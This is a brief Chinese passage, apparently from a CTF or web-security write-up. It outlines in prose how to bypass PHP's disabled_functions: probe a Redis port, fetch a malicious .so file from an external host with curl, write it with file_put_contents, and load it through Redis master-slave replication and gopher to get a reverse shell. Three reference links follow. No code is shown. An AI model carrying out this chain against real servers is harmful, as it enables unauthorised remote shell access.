方法2：利用redis主从复制加载so文件绕过`disabled_functions`

>先探测端口到redis是8888端口，然后需要通过curl外网得到so文件，然后file_put_contents写入so文件。这儿利用redis的主从复制和gopher协议，来加载so文件，从而实现反弹shell

##  参考文章

```
https://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/

https://www.anquanke.com/post/id/254387#h3-10
https://xz.aliyun.com/t/5598#toc-6
```

